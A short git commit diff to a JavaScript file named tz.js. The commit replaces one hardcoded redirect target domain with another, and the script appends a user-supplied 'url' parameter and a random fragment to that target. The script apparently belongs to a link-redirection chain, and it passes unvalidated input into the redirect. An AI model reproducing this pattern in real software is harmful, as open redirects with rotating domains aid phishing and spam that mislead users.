c6bc0b4d51575966f0c9b597366e89fc053fca83
xcz789 <2644987@qq.com>
2024-07-11 14:49:59 +0800

    Update tz.js

--- tz.js
+++ tz.js
@@ -9,7 +9,7 @@ const customParam = urlParams.get('url');
 const randomString = Math.random().toString(36).substring(2); // 生成随机字符串，包括数字和小写字母
 
 // 构建跳转链接
-let redirectURL = "https://dl.jiyusy.top/jyprod/20240708/13cffefeda2f4f83b60fc8384ed030a0.htm";
+let redirectURL = "https://p1.meiyintutu.com/s/qq;42y/p.html";
 if (customParam) {
     redirectURL += "?url=" + customParam + "#" + randomString; // 将随机字符串添加到参数后面
 }
